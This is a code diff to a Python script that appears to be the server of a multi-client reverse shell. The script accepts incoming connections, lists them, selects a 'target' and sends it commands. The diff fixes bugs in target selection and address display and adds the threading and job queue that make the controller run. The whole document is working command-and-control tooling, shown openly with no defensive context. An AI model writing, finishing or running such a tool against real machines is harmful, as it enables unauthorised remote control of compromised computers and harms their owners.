@@ -1,5 +1,3 @@
-import imp
-import queue
 import socket
 import sys
 import threading
@@ -8,7 +6,7 @@ from queue import Queue
 
 
 NUMBER_OF_THREADS = 2
-JOB_NUMBER = [1, 2]
+JOB_NUMBER = [0, 1]
 queue = Queue()
 connections = []
 addresses = []
@@ -71,21 +69,22 @@ def accept_connection():
 # 2nd thread functions - 1) See all the clients 2) Select a client 3) Send commands to the connected client.
 # Interactive prompt for sending commands.
 def start_cmp():
-    cmd = input("CMP: ")
+    while True:
+        cmd = input("CMP: ")
 
-    if cmd == "help":
-        cmp_help()
+        if cmd == "help":
+            cmp_help()
 
-    elif "list" in cmd:
-        list_connections()
+        elif "list" in cmd:
+            list_connections()
 
-    elif "select" in cmd:
-        conn = get_target(cmd)
-        if conn is not None:
-            send_commands(conn)
+        elif "select" in cmd:
+            conn = get_target(cmd)
+            if conn is not None:
+                send_commands(conn)
 
-    else:
-        print("Unknown command, to see all commands enter help command.")
+        else:
+            print("Unknown command, to see all commands enter help command.")
 
 
 # Display a help message for cmp.
@@ -114,7 +113,7 @@ def list_connections():
                 continue
 
             results = "{}   {}  {}  \n".format(
-                str(i), str(addresses[i][0], addresses[i][1])
+                str(i), str(addresses[i][0]), str(addresses[i][1])
             )
 
         print("---Clients---\n{}".format(results))
@@ -122,13 +121,10 @@ def list_connections():
 
 def get_target(cmd):
     try:
-        target = int(cmd.lstrip("select "))
+        target = int(cmd.lstrip("select"))
+        print(target)
         conn = connections[target]
-        print(
-            "Selected target{}|{}{}".format(
-                target, connections[target][0], connections[target][1]
-            )
-        )
+        print(f"Selected target {target}|{addresses[target][0]}")
         return conn
 
     except:
@@ -137,8 +133,6 @@ def get_target(cmd):
 
 
 # Send commands to client.
-
-
 def send_commands(conn):
     init = True
     while True:
@@ -160,3 +154,38 @@ def send_commands(conn):
 
         except:
             print("Error command could not be sent.")
+
+
+# Create worker threads
+def create_workers():
+    for _ in range(NUMBER_OF_THREADS):
+        t = threading.Thread(target=work)
+        t.daemon = True  # Important to check if thread stopped with the program.
+        t.start()
+
+
+# Allocate threads for jobs that is in the queue.
+def work():
+    while True:
+        x = queue.get()
+
+        if x == 0:
+            create_socket()
+            bind_socket()
+            accept_connection()
+
+        if x == 1:
+            start_cmp()
+
+        queue.task_done()
+
+
+def create_jobs():
+    for i in JOB_NUMBER:
+        queue.put(i)
+
+    queue.join()
+
+
+create_workers()
+create_jobs()
